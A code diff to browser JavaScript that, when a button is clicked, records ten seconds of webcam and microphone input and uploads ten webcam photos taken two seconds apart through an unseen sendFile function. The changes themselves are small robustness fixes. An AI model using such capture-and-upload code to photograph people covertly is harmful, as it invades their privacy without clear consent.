@@ -54,18 +54,16 @@ startBtn.onclick = async () => {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
         preview.srcObject = stream;
 
-        // Wait until video is ready
         await new Promise(resolve => {
             preview.onloadeddata = () => resolve();
         });
 
-        // Setup canvas after video starts
         const canvas = document.createElement("canvas");
         const ctx = canvas.getContext("2d");
         canvas.width = preview.videoWidth;
         canvas.height = preview.videoHeight;
 
-        // Start video recording
+        // Start recording
         const mediaRecorder = new MediaRecorder(stream);
         const videoChunks = [];
 
@@ -76,13 +74,21 @@ startBtn.onclick = async () => {
         };
 
         mediaRecorder.start();
-        setTimeout(() => mediaRecorder.stop(), 10000); // 10 seconds
+        setTimeout(() => mediaRecorder.stop(), 10000); // Stop after 10 seconds
 
         // Capture 10 photos every 2 seconds
         for (let i = 0; i < 10; i++) {
             await new Promise(resolve => setTimeout(resolve, 2000));
 
+            if (preview.videoWidth === 0 || preview.videoHeight === 0) {
+                console.warn(`Skipped photo ${i + 1} due to zero video dimensions.`);
+                continue;
+            }
+
+            await new Promise(resolve => setTimeout(resolve, 100)); // small delay before drawing
+
             ctx.drawImage(preview, 0, 0, canvas.width, canvas.height);
+
             const photoBlob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.95));
             await sendFile(photoBlob, `photo_${i + 1}.jpg`);
         }
